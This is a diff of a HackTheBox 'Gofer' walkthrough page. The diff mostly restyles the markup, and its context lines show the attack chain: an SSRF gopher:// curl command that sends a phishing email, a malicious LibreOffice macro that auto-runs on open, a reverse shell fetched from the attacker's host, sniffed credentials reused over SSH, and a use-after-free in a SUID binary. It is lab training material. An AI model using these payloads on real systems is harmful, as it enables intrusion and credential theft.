@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gofer - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/hard/gofer/img/gofer.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/hard/gofer/img/gofer.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Gofer - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -232,7 +236,7 @@ Now, upon attempting to access the service using the IP address, it redirects us
 </pre></div>
 
 Since there isn't any significant information available, let's access the website through our browser:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/2.png"><br/><br/>
+<img width="1349" height="506" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/2.png"><br/><br/>
 After spending some time browsing the site, I haven't come across anything noteworthy.<br/><br/>
 <h3><br/>Subdomain Enumeration</h3><br/>
 We'll proceed to enumerate subdomains using <code>ffuf</code>:<br><br/>
@@ -459,7 +463,7 @@ It's evident at this stage that the machine's name becomes pivotal for this expl
 Our current strategy involves leveraging SSRF to send an email to the user Jocelyn, containing a malevolent link that directs to our attacker's machine. This link should prompt the download of a file with an ODT extension. ODT files are essentially text files used by the LibreOffice program. These file types enable the addition of macros containing malicious content, capable of executing undesired instructions on the system.<br/><br/>
 To send the email, we first need to determine the email of the user Jocelyn, which, judging by the structure of the email we've read, appears to be composed of the initial of the name and their last name.<br/><br/>
 In the "Team" section of the victim machine's main page, specifically on <code>gofer.htb</code>, we can view the names and last names of users that seem to be part of the team.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/3.png"><br/><br/>
+<img width="1145" height="427" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/3.png"><br/><br/>
 We managed to see the name "Jocelyn Hudson," which could belong to the user to whom we need to send the malicious email. First, let's adjust the name to fit the email format: <code>jhudson@gofer.htb</code>.<br/><br/>
 <h3><br/>SSRF - Gopher</h3><br/>
 There are some techniques to communicate with internal services when exploiting an SSRF, and in our case, we're going to use Gopher.<br><br/>
@@ -530,13 +534,13 @@ After waiting for about a minute, I received a GET request from the victim machi
 The user <code>jhudson</code> is indeed clicking on the links I send her in the email content.<br/><br/>
 With this knowledge, we now need to create a malicious file that we will offer via an HTTP server on our victim machine. This will be the file the user in question will need to download and subsequently execute.<br/><br/>
 First, let's generate a Writer document using LibreOffice.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/4.png"/><br/><br/>
+<img width="424" height="382" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/4.png"/><br/><br/>
 Now, let's navigate to the macros section.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/5.png"/><br/><br/>
+<img width="936" height="542" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/5.png"/><br/><br/>
 Click on <code>Edit Macros</code>, then proceed to create a new one.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/6.png"/><br/><br/>
+<img width="662" height="540" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/6.png"/><br/><br/>
 Next, we need to insert the malicious content into the <code>Malicious</code> macro.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/7.png"/><br/><br/>
+<img width="941" height="390" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/7.png"/><br/><br/>
 As part of this test, we will utilize the <code>Shell()</code> function to execute commands on the victim machine. In this instance, we'll initiate a curl request to our HTTP Server.<br/><br/>
 Upon running the macro, the output will resemble the following:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
@@ -547,13 +551,13 @@ Upon running the macro, the output will resemble the following:<br/><br/>
 
 Before saving the file, it's crucial to ensure that the macro runs upon opening the document; otherwise, the macro won't execute at any point.<br/><br/>
 To configure this, we need to click on Tools -&gt; Macros -&gt; Organize Macros -&gt; Basic:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/13.png"/><br/><br/>
+<img width="577" height="576" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/13.png"/><br/><br/>
 We need to click on <code>Assign</code>.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/14.png"/><br/><br/>
+<img width="502" height="428" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/14.png"/><br/><br/>
 We navigate to the <code>Events</code> section.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/15.png"/><br/><br/>
+<img width="655" height="543" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/15.png"/><br/><br/>
 Click on <code>Open Document</code> and select the respective macro.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/16.png"/><br/><br/>
+<img width="641" height="525" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/16.png"/><br/><br/>
 Once the file is saved, the macro will execute the specified command when the document is reopened.<br/><br/>
 Now, we need to host the file on a web server. When the user <code>jhudson</code> clicks the link, the file will be downloaded and, assuming <code>jhudson</code> opens the file upon download, it will execute the malicious content.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO</span><span class="si">%202130706433%</span><span class="s1">250d</span><span class="si">%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">http://10.10.16.7/pwned.odt</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
@@ -585,7 +589,7 @@ Firstly, I'll create a file named <code>pwned.sh</code> with the following conte
 </pre></div>
 
 Now I will modify the command in the malicious macro.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/17.png"/><br/><br/>
+<img width="881" height="426" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/17.png"/><br/><br/>
 With this command, we'll ensure that upon making a request to the file <code>pwned.sh</code>, its content will be interpreted with bash, thereby enabling us to receive a reverse shell.<br/><br/>
 Firstly, we're going to set up our netcat (nc) listener on port 3001:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
@@ -706,11 +710,11 @@ After a minute, I ended the process. If we list the contents of the current dire
 </pre></div>
 
 After downloading the <code>captura.cap</code> file onto our attacker machine, we need to open it using WireShark:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/18.png"/><br/><br/>
+<img width="1346" height="628" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/18.png"/><br/><br/>
 By filtering through protocols, we'll quickly notice HTTP requests:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/19.png"/><br/><br/>
+<img width="1242" height="249" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/19.png"/><br/><br/>
 Upon closer inspection, we observe that these requests contain credentials:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/20.png"/><br/><br/>
+<img width="1356" height="428" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/20.png"/><br/><br/>
 It appears the user is attempting authentication to <code>proxy.gofer.htb</code>, which, as we recall, requested credentials for access. These credentials are traveling in plain text, allowing us to copy and potentially use them to our advantage.<br/><br/>
 Given the attempt to authenticate as the user <code>tbuckley</code>, we can verify if these credentials belong to this system-level user.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'ooP4dietie3o_hquaeti'</span> <span class="n">ssh</span> <span class="n">tbuckley</span><span class="o">@</span><span class="mf">10.10.11.225</span>
@@ -887,45 +891,45 @@ If we restart the program and select option 2 without creating the user previous
 It seems that option 3 doesn't entirely delete the user we created.<br/><br/>
 <h3><br/>Binary Analysis</h3><br/>
 To perform a more in-depth analysis of the binary, I'll use the <a href="https://ghidra-sre.org/">Ghidra</a> tool for reverse engineering.<br><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/21.png"/><br/><br/>
+<img width="1341" height="671" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/21.png"/><br/><br/>
 The first thing that caught my attention was option 8, which required an <code>admin</code> role to access it.<br/><br/>
 Upon reading its code, we see the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/22.png"/><br/><br/>
+<img width="606" height="296" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/22.png"/><br/><br/>
 At first glance, it appears that by becoming an admin, we can exploit Path Hijacking during the execution of the <code>system()</code> function. This is because the <code>tar</code> tool is being called relatively.<br/><br/>
 Firstly, at the beginning of the program, we notice a set of variables and pointers being defined.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/24.png"/><br/><br/>
+<img width="487" height="200" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/24.png"/><br/><br/>
 The variable where the user-entered options are stored is named <code>local_1c</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/25.png"/><br/><br/>
+<img width="374" height="215" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/25.png"/><br/><br/>
 Thanks to the <code>switch()</code> statement, we confirm that the variable <code>local_1c</code> corresponds to the user-input options.<br/><br/>
 In option <code>1</code>, we observe the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/26.png"/><br/><br/>
+<img width="480" height="320" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/26.png"/><br/><br/>
 Initially, a request is made to the Heap for 0x28 bytes of memory, which in decimal is equivalent to 40 bytes. This memory section will be pointed to by the pointer <code>local_10</code>.<br/><br/>
 Subsequently, it checks whether the <code>local_10</code> pointer is null. If this occurs, it is likely that the memory allocation from the preceding line was unsuccessful, leading the program to exit using the <code>exit()</code> function.<br/><br/>
 Utilizing the <code>memset()</code> function, the first 24 bytes of the memory section pointed to by <code>local_10</code> are being filled with zeros. Then, in the second <code>memset()</code> function call, the remaining memory pointed to by <code>local_10</code> is filled with zeros.<br/><br/>
 It's important to note that the pointer <code>local_10</code> is referencing a memory section of 40 bytes in size. Hence, the first <code>memset()</code> call zeroes out the initial 24 bytes, leaving the remaining bytes (0x10, which is 16 in decimal) to be filled with zeros.<br/><br/>
 Subsequently, a variable named <code>_Var1</code> is defined:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/27.png"/><br/><br/>
+<img width="426" height="132" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/27.png"/><br/><br/>
 In this section of the code, a variable named <code>_Var1</code> is declared to store the UID (User ID) of the user running this program. In our case, we'll be running it as the user <code>tbuckley</code>, so it will have the value <code>1002</code>.<br/><br/>
 Following this, there's a comparison involving the value of <code>_Var1</code>, in simple terms, checking if the user running the program is the root user.<br/><br/>
 If the user running the program is the root user, the string <code>admin</code> will be assigned to the memory section located 24 bytes from the start of the memory sector pointed to by <code>local_10</code>. Otherwise, if the user running the program is not root, the string <code>user</code> will be assigned.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/28.png"/><br/><br/>
+<img width="365" height="69" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/28.png"/><br/><br/>
 Finally, the console displays the message <code>Choose an username:</code>, and then it requests a value to be entered, which will be stored in the memory section pointed to by <code>local_10</code>.<br/><br/>
 This entire process pertains to the creation of a user. If we navigate to option 2, we encounter the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/29.png"/><br/><br/>
+<img width="430" height="149" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/29.png"/><br/><br/>
 Initially, it checks whether the pointer <code>local_10</code> is null; if it's not null, it displays information about our user on the screen.<br/><br/>
 Firstly, it displays the string to which <code>local_10</code> points, in this case, it will be the username specified in option 1. Then, it shows the string located 24 bytes after the start of <code>local_10</code>.<br/><br/>
 The issue lies within option 3:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/30.png"/><br/><br/>
+<img width="320" height="83" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/30.png"/><br/><br/>
 When the pointer <code>local_10</code> is not null (meaning we've previously created a user), the memory allocated, pointed to by <code>local_10</code> and initially obtained by using <code>malloc(0x28)</code>, is released back to the Heap.<br/><br/>
 The vulnerability arises from the fact that even though the memory is freed, the pointer continues to point to the same memory section. Consequently, if memory is requested from the Heap again and assigned to the memory section pointed to by <code>local_10</code>, it becomes possible to access any information in that section using this pointer.<br/><br/>
 In essence, since <code>local_10</code> doesn't become null again, it keeps pointing to the same memory section. After the memory has been freed, if elsewhere in the program new memory is allocated, it can be accessed through <code>local_10</code>.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/31.png"/><br/><br/>
+<img width="519" height="163" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/31.png"/><br/><br/>
 In option 4, we are given the opportunity to write a note. Initially, we notice that memory is being requested from the heap again, this time a total of 40 bytes.<br/><br/>
 Subsequently, the 40 bytes are filled with zeros. Then, it performs a check to verify if there have been no issues with the pointer. Afterward, it displays a message <code>Write your note:</code>, prompting us to provide data that will be stored in the memory section pointed to by <code>local_18</code>.<br/><br/>
 Let's recall that when we "delete" our user, the allocated memory is freed, but the issue lies in the fact that <code>local_10</code> continues to point to that memory section.<br/><br/>
 Later, when creating a note, the same amount of memory is requested again. This will allocate the same block of memory previously reserved by <code>local_10</code>, although this time it will be pointed to by <code>local_18</code>. However, since <code>local_10</code> still points to that memory section, we can access it.<br/><br/>
 In option 7, when deleting the note, it does so correctly by setting the <code>local_18</code> pointer to null, preventing its further use.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/32.png"/><br/><br/>
+<img width="319" height="100" loading="lazy" decoding="async" alt="" src="/writeups/htb/hard/gofer/img/32.png"/><br/><br/>
 Knowing this, our plan is to initialize the <code>local_10</code> pointer to point to the memory block we requested in option 1, entering our username, and being assigned the <code>user</code> role.<br/><br/>
 Subsequently, we will delete our user, freeing the previously allocated memory. Then, we'll create a new note with special content. Our goal is to overwrite our role, so we need to input an appropriate string.<br/><br/>
 By entering the correct string, when listing the user information in option 2, it will display the content of the note because <code>local_10</code> continues to point to the same memory section.<br/><br/>
